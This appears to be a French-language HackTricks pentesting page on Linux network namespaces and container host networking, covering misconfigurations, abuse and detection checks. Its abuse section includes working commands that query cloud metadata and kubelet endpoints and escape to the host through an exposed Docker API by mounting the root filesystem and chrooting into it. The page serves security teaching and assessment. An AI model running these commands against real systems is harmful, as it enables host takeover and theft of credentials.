# Espace de noms réseau

{{#include ../../../../../banners/hacktricks-training.md}}

## Vue d'ensemble

L'espace de noms réseau isole les ressources liées au réseau telles que les interfaces, les adresses IP, les tables de routage, l'état ARP/voisin, les règles de pare-feu, les sockets, et le contenu de fichiers comme `/proc/net`. C'est pourquoi un conteneur peut avoir ce qui ressemble à son propre `eth0`, ses propres routes locales, et son propre périphérique loopback sans posséder la pile réseau réelle de l'hôte.

D'un point de vue sécurité, cela a de l'importance car l'isolation réseau ne se résume pas au binding de ports. Un espace de noms réseau privé limite ce que la charge de travail peut observer ou reconfigurer directement. Une fois que cet espace de noms est partagé avec l'hôte, le conteneur peut soudainement gagner en visibilité sur les services en écoute de l'hôte, les services locaux à l'hôte, et les points de contrôle réseau qui n'étaient pas censés être exposés à l'application.

## Fonctionnement

Un espace de noms réseau fraîchement créé commence avec un environnement réseau vide ou presque vide jusqu'à ce que des interfaces y soient attachées. Les runtimes de conteneurs créent ou connectent ensuite des interfaces virtuelles, attribuent des adresses et configurent les routes afin que la charge de travail dispose de la connectivité attendue. Dans les déploiements basés sur un bridge, cela signifie généralement que le conteneur voit une interface soutenue par veth connectée à un pont de l'hôte. Dans Kubernetes, les plugins CNI gèrent la configuration équivalente pour le networking des Pod.

Cette architecture explique pourquoi `--network=host` ou `hostNetwork: true` représente un changement si drastique. Au lieu de recevoir une pile réseau privée préconfigurée, la charge de travail rejoint celle réelle de l'hôte.

## Laboratoire

Vous pouvez voir un espace de noms réseau presque vide avec:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
Et vous pouvez comparer les conteneurs normaux et les conteneurs utilisant le réseau de l'hôte avec :
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
Le conteneur connecté au réseau de l'hôte n'a plus sa propre vue isolée des sockets et des interfaces. Ce changement seul est déjà significatif, avant même de se demander quelles capacités le processus possède.

## Utilisation à l'exécution

Docker et Podman créent normalement un namespace réseau privé pour chaque conteneur sauf configuration contraire. Kubernetes attribue généralement à chaque Pod son propre namespace réseau, partagé par les conteneurs à l'intérieur de ce Pod mais séparé de l'hôte. Les systèmes Incus/LXC offrent également une isolation riche basée sur les namespaces réseau, souvent avec une plus grande variété de configurations de réseau virtuel.

Le principe commun est que le réseau privé est la frontière d'isolation par défaut, tandis que l'utilisation du réseau de l'hôte constitue une dérogation explicite à cette frontière.

## Erreurs de configuration

La mauvaise configuration la plus importante est simplement le partage du namespace réseau de l'hôte. Cela se fait parfois pour des raisons de performance, de supervision bas niveau ou de commodité, mais cela supprime l'une des frontières les plus nettes disponibles pour les conteneurs. Les listeners locaux à l'hôte deviennent plus directement atteignables, les services limités à localhost peuvent devenir accessibles, et des capacités telles que `CAP_NET_ADMIN` ou `CAP_NET_RAW` deviennent beaucoup plus dangereuses car les opérations qu'elles permettent s'appliquent désormais à l'environnement réseau de l'hôte lui-même.

Un autre problème est l'octroi excessif de capacités liées au réseau même lorsque le namespace réseau est privé. Un namespace privé aide, mais n'innocente pas les raw sockets ni le contrôle réseau avancé.

Dans Kubernetes, `hostNetwork: true` change également le degré de confiance que vous pouvez accorder à la segmentation réseau au niveau du Pod. La documentation de Kubernetes indique que de nombreux plugins réseau ne peuvent pas correctement distinguer le trafic d'un Pod en `hostNetwork` pour le matching `podSelector` / `namespaceSelector` et le traitent donc comme du trafic node ordinaire. Du point de vue d'un attaquant, cela signifie qu'une charge de travail `hostNetwork` compromise doit souvent être considérée comme un point d'ancrage réseau au niveau du nœud plutôt que comme un Pod normal toujours contraint par les mêmes hypothèses de politique que les charges de travail sur réseau overlay.

## Abus

Dans des configurations faiblement isolées, un attaquant peut inspecter les services à l'écoute de l'hôte, atteindre des endpoints de gestion liés uniquement au loopback, sniffer ou interférer avec le trafic selon les capacités et l'environnement exacts, ou reconfigurer le routage et l'état du pare-feu si `CAP_NET_ADMIN` est présent. Dans un cluster, cela peut aussi faciliter le mouvement latéral et la reconnaissance du plan de contrôle.

Si vous suspectez l'utilisation du réseau de l'hôte, commencez par confirmer que les interfaces et les listeners visibles appartiennent à l'hôte plutôt qu'à un réseau de conteneur isolé :
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Les services accessibles uniquement via loopback sont souvent la première découverte intéressante :
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Si des capacités réseau sont présentes, testez si la charge de travail peut inspecter ou altérer la pile visible :
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
Sur les noyaux modernes, le réseau hôte combiné à `CAP_NET_ADMIN` peut aussi exposer le chemin des paquets au‑delà de simples modifications `iptables` / `nftables`. Les qdiscs et filtres de `tc` sont eux aussi limités au namespace, donc dans un namespace réseau host partagé ils s'appliquent aux interfaces host que le conteneur peut voir. Si `CAP_BPF` est présent en plus, des programmes eBPF liés au réseau tels que les loaders TC et XDP deviennent également pertinents :
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
Cela importe car un attaquant peut être capable de dupliquer, rediriger, façonner ou abandonner le trafic au niveau de l'interface hôte, et pas seulement de réécrire les règles du pare-feu. Dans un espace de noms réseau privé, ces actions sont confinées à la vue du conteneur ; dans un espace de noms hôte partagé, elles impactent l'hôte.

Dans des environnements de cluster ou cloud, le réseau hôte justifie aussi une reconnaissance locale rapide (recon) des métadonnées et des services adjacents au plan de contrôle :
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
### Exemple complet : Host Networking + Local Runtime / Kubelet Access

Le Host networking ne confère pas automatiquement host root, mais il expose souvent des services qui sont intentionnellement accessibles uniquement depuis le node lui-même. Si l'un de ces services est faiblement protégé, le Host networking devient une voie directe de privilege-escalation.

Docker API on localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet sur localhost :
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Impact :

- compromission directe de l'hôte si une API runtime locale est exposée sans protection adéquate
- reconnaissance du cluster ou mouvement latéral si kubelet ou des agents locaux sont accessibles
- manipulation du trafic ou déni de service si combiné avec `CAP_NET_ADMIN`

## Vérifications

L'objectif de ces vérifications est de déterminer si le processus dispose d'une pile réseau privée, quelles routes et quels sockets d'écoute sont visibles, et si la vue réseau ressemble déjà à celle de l'hôte avant même que vous testiez les capabilities.
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
```
- Si `/proc/self/ns/net` et `/proc/1/ns/net` ressemblent déjà à ceux de l'hôte, le conteneur peut partager l'espace de noms réseau de l'hôte ou un autre espace de noms non privé.
- `lsns -t net` et `ip netns identify` sont utiles lorsque le shell est déjà dans un namespace nommé ou persistant et que vous voulez le corréler avec les objets `/run/netns` côté hôte.
- `ss -lntup` est particulièrement précieux car il révèle les écouteurs limités au loopback et les endpoints de gestion locaux.
- Les routes, noms d'interface, contexte de pare-feu, état de `tc` et les attachements eBPF deviennent beaucoup plus importants si `CAP_NET_ADMIN`, `CAP_NET_RAW` ou `CAP_BPF` sont présents.
- Dans Kubernetes, l'échec de la résolution d'un nom de service depuis un Pod en `hostNetwork` peut simplement signifier que le Pod n'utilise pas `dnsPolicy: ClusterFirstWithHostNet`, et non que le service est absent.

Lors de l'examen d'un conteneur, évaluez toujours l'espace de noms réseau en conjonction avec l'ensemble de capabilities. La mise en réseau de l'hôte combinée à des capacités réseau étendues représente une posture très différente du networking en bridge associé à un ensemble restreint de capabilities par défaut.

## Références

- [Kubernetes NetworkPolicy and `hostNetwork` caveats](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [eBPF token and capability requirements for network-related eBPF programs](https://docs.ebpf.io/linux/concepts/token/)
{{#include ../../../../../banners/hacktricks-training.md}}
